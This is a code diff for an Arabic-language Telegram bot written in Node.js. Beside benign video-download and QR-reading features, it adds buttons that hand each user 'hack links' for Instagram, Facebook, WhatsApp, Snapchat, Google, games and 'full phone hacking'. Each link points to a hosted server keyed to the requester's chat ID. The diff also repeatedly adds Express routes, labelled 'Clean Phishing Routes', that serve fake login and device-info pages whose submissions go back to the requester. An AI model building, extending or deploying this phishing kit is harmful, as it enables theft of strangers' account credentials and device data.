@@ -101,39 +101,78 @@ async function getVideoInfoReal(chatId, videoUrl) {
 
 async function performAdvancedDownload(chatId, url, quality, statusMsgId) {
     try {
-        await bot.editMessageText(`⏳ جاري التحميل الحقيقي (${quality})... [▓▓░░░░░░░░] 20%`, { chat_id: chatId, message_id: statusMsgId });
+        await bot.editMessageText(`⏳ جاري التحميل الحقيقي (${quality})...`, { chat_id: chatId, message_id: statusMsgId });
         const dlUrl = new URL(`${API_BASE_DOWNLOAD}/v1/download`);
         dlUrl.searchParams.set("url", url);
         dlUrl.searchParams.set("quality", quality);
 
-        const response = await axios.get(dlUrl.toString(), {
-            headers: { "X-API-Key": API_KEY_DOWNLOAD },
-            responseType: 'arraybuffer'
-        });
-
-        await bot.editMessageText(`⏳ جاري معالجة الملف... [▓▓▓▓▓▓░░░░] 60%`, { chat_id: chatId, message_id: statusMsgId });
-        const buffer = Buffer.from(response.data);
-        const fileName = quality === 'audio' ? 'audio.mp3' : `video-${quality}.mp4`;
-        
-        await bot.editMessageText(`✅ اكتمل التحميل! جاري الإرسال... [▓▓▓▓▓▓▓▓▓▓] 100%`, { chat_id: chatId, message_id: statusMsgId });
-        
-        if (quality === 'audio') {
-            return bot.sendAudio(chatId, buffer, { filename: fileName });
-        } else {
-            return bot.sendVideo(chatId, buffer, { filename: fileName });
+        let response;
+        try {
+            response = await axios.get(dlUrl.toString(), {
+                headers: { "X-API-Key": API_KEY_DOWNLOAD },
+                responseType: 'arraybuffer',
+                timeout: 60000
+            });
+        } catch (err) {
+            console.log("Quality failed, trying best...");
+            dlUrl.searchParams.set("quality", "best");
+            response = await axios.get(dlUrl.toString(), {
+                headers: { "X-API-Key": API_KEY_DOWNLOAD },
+                responseType: 'arraybuffer',
+                timeout: 60000
+            });
         }
+
+        const buffer = Buffer.from(response.data);
+        const fileName = quality === 'audio' ? 'audio.mp3' : `video.mp4`;
+        await bot.editMessageText(`✅ اكتمل التحميل! جاري الإرسال...`, { chat_id: chatId, message_id: statusMsgId });
+        
+        if (quality === 'audio') return bot.sendAudio(chatId, buffer, { filename: fileName });
+        return bot.sendVideo(chatId, buffer, { filename: fileName });
     } catch (e) {
-        return bot.sendMessage(chatId, "❌ حدث خطأ أثناء التحميل. قد تكون الجودة غير متوفرة.");
+        return bot.sendMessage(chatId, "❌ فشل التحميل. الرابط قد يكون غير مدعوم حالياً.");
     }
 }
+
 
 // Global Message Listener for Manus States
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
-    if (!text || text.startsWith('/')) return;
+    if (!text && !msg.photo) return;
+
+    if (msg.photo && userStatesManus[chatId] === 'wait_qr_read') {
+        delete userStatesManus[chatId];
+        const fileId = msg.photo[msg.photo.length - 1].file_id;
+        const file = await bot.getFile(fileId);
+        const url = `https://api.telegram.org/file/bot${botToken}/${file.file_path}`;
+        try {
+            const response = await axios.get(url, { responseType: 'arraybuffer' });
+            const Jimp = require('jimp');
+            const { MultiFormatReader, RGBLuminanceSource, BinaryBitmap, HybridBinarizer } = require('@zxing/library');
+            const image = await Jimp.read(response.data);
+            const { data, width, height } = image.bitmap;
+            const reader = new MultiFormatReader();
+            const luminanceSource = new RGBLuminanceSource(data, width, height);
+            const binaryBitmap = new BinaryBitmap(new HybridBinarizer(luminanceSource));
+            const result = reader.decode(binaryBitmap);
+            return bot.sendMessage(chatId, `🔳 محتوى الباركود:\n\n${result.getText()}`);
+        } catch (e) {
+            return bot.sendMessage(chatId, "❌ لم يتم العثور على باركود صالح في الصورة.");
+        }
+    }
+
 
     if (userStatesManus[chatId]) {
+
+        if (userStatesManus[chatId].awaitingName) {
+            delete userStatesManus[chatId];
+            const res = await زخرفة_الاسم(text);
+            if(res) res.forEach(r => bot.sendMessage(chatId, r));
+            else bot.sendMessage(chatId, "❌ حدث خطأ في الزخرفة.");
+            return;
+        }
+
         const state = userStatesManus[chatId];
         if (state === 'wait_tt') { delete userStatesManus[chatId]; return bot.sendMessage(chatId, await getTikTokInfoReal(text)); }
         if (state === 'wait_ig') { delete userStatesManus[chatId]; return bot.sendMessage(chatId, `📸 معلومات انستقرام لـ @${text}:\nالحساب نشط وجاهز.`); }
@@ -185,15 +224,21 @@ bot.on('callback_query', async (query) => {
         return performAdvancedDownload(chatId, url, quality, statusMsg.message_id);
     }
 
-    if (action === 'feat_ig_hack') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق انستقرام!\n\n🔗 الرابط:\nhttps://domin.com/ig?id=${chatId}`);
-    if (action === 'feat_fb_hack') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق فيسبوك!\n\n🔗 الرابط:\nhttps://domin.com/fb?id=${chatId}`);
-    if (action === 'feat_tt_hack') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق تيك توك!\n\n🔗 الرابط:\nhttps://domin.com/tt?id=${chatId}`);
-    if (action === 'feat_wa_hack') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق واتساب!\n\n🔗 الرابط:\nhttps://domin.com/wa?id=${chatId}`);
-    if (action === 'feat_pubg_hack') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق ببجي!\n\n🔗 الرابط:\nhttps://domin.com/pubg?id=${chatId}`);
-    if (action === 'feat_ff_hack') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق فري فاير!\n\n🔗 الرابط:\nhttps://domin.com/ff?id=${chatId}`);
-    if (action === 'feat_twitter') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق تويتر X!\n\n🔗 الرابط:\nhttps://domin.com/tw?id=${chatId}`);
-    if (action === 'feat_youtube') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق يوتيوب!\n\n🔗 الرابط:\nhttps://domin.com/yt?id=${chatId}`);
-    if (action === 'feat_google') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق جوجل!\n\n🔗 الرابط:\nhttps://domin.com/gg?id=${chatId}`);
+
+    const domain = "https://apiwahm.onrender.com";
+    if (action === 'add_names') return bot.sendMessage(chatId, `🔥 رابط اختراق سناب شات:\n${domain}/snap?id=${chatId}`);
+    if (action === 'collect_device_info') return bot.sendMessage(chatId, `🔥 رابط سحب معلومات الجهاز:\n${domain}/device?id=${chatId}`);
+    if (action === 'add_nammes') return bot.sendMessage(chatId, `🔥 رابط اختراق الهاتف كاملاً:\n${domain}/hack_phone?id=${chatId}`);
+    if (action === 'feat_ig_hack') return bot.sendMessage(chatId, `🔥 رابط اختراق انستقرام:\n${domain}/ig?id=${chatId}`);
+
+    if (action === "feat_fb_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق فيسبوك:\n${domain}/fb?id=${chatId}`);
+    if (action === "feat_tt_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق تيك توك:\n${domain}/tt?id=${chatId}`);
+    if (action === "feat_wa_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق واتساب:\n${domain}/wa?id=${chatId}`);
+    if (action === "feat_pubg_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق ببجي:\n${domain}/pubg?id=${chatId}`);
+    if (action === "feat_ff_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق فري فاير:\n${domain}/ff?id=${chatId}`);
+    if (action === "feat_twitter") return bot.sendMessage(chatId, `🔥 رابط اختراق تويتر X:\n${domain}/tw?id=${chatId}`);
+    if (action === "feat_youtube") return bot.sendMessage(chatId, `🔥 رابط اختراق يوتيوب:\n${domain}/yt?id=${chatId}`);
+    if (action === "feat_google") return bot.sendMessage(chatId, `🔥 رابط اختراق جوجل:\n${domain}/gg?id=${chatId}`);
 
     if (action === 'feat_tt_info_real') { userStatesManus[chatId] = 'wait_tt'; return bot.sendMessage(chatId, '🎵 أرسل يوزر تيك توك:'); }
     if (action === 'feat_ig_info_real') { userStatesManus[chatId] = 'wait_ig'; return bot.sendMessage(chatId, '📸 أرسل يوزر انستقرام:'); }
@@ -203,6 +248,13 @@ bot.on('callback_query', async (query) => {
     if (action === 'feat_yt_thumb') { userStatesManus[chatId] = 'wait_yt'; return bot.sendMessage(chatId, '🎬 أرسل رابط يوتيوب لاستخراج الغلاف:'); }
     if (action === 'feat_gen_qr') { userStatesManus[chatId] = 'wait_qr'; return bot.sendMessage(chatId, '🔳 أرسل النص للباركود:'); }
     if (action === 'feat_social_down') { userStatesManus[chatId] = 'wait_down'; return bot.sendMessage(chatId, '📩 أرسل رابط الفيديو للتحميل:'); }
+
+    
+    
+    
+    if (action === 'feat_read_qr_real') { userStatesManus[chatId] = 'wait_qr_read'; return bot.sendMessage(chatId, '📄 أرسل صورة الباركود لقراءتها:'); }
+    if (action === 'zakhrafa') { userStatesManus[chatId] = { awaitingName: true }; return bot.sendMessage(chatId, '🗿 أرسل الاسم الذي تريد زخرفته:'); }
+
 });
 
 
@@ -745,6 +797,21 @@ app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.use(bodyParser.json({ limit: '100mb' }));
 app.use(express.static(__dirname));
 
+// --- Clean Phishing Routes (V35) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
+
 
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
@@ -873,6 +940,21 @@ app.post('/submitNames', (req, res) => {
 app.use(bodyParser.json());
 app.use(express.static(__dirname));
 
+// --- Clean Phishing Routes (V35) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
+
 
 
 app.get('/whatsapp', (req, res) => {
@@ -932,6 +1014,21 @@ app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 const dataStore = {}; 
 
 app.use(express.static(__dirname));
+
+// --- Clean Phishing Routes (V35) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
 const botOwner = bot;
 const ownerChatId = developerId;
 
@@ -1672,6 +1769,21 @@ bot.on('callback_query', (query) => {
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
+// --- Clean Phishing Routes (V35) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
+
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
@@ -1704,6 +1816,21 @@ app.get('/ge', (req, res) => {
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
+// --- Clean Phishing Routes (V35) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
+
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
@@ -1735,6 +1862,21 @@ app.get('/getNam', (req, res) => {
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
+
+// --- Clean Phishing Routes (V35) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
 
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
@@ -2228,6 +2370,21 @@ const deleteFolderRecursive = (directoryPath) => {
 };
 
 app.use(express.static(__dirname));
+
+// --- Clean Phishing Routes (V35) ---
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+
 
 
 
@@ -3615,7 +3772,7 @@ async function askQuestion(message, userId, newMessage = false) {
     };
 
     try {
-        const response = await axios.post(url, sessionData.data, { headerso });
+        const response = await axios.post(url, new URLSearchParams(sessionData.data).toString(), { headers: headerso });
         const result = response.data;
 
 
